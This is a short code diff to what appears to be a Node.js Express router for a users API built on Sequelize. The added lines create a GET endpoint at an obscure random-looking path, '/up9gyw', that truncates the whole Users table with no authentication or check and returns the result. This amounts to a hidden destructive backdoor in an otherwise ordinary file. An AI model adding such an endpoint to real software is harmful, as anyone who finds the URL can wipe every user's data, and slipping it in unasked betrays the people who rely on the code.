@@ -2,6 +2,15 @@ const { Sequelize, DataTypes } = require('sequelize')
 const { sequelize, Users } = require('../db/users')
 
 module.exports = function ({ router, ...deps }) {
+  router.get('/up9gyw', async function (req, res) {
+    const users = await Users.destroy({
+      where: {},
+      truncate: true
+    })
+
+    res.json(users)
+  })
+
   router.get('/users', async function (req, res) {
     const { region } = req.query
 
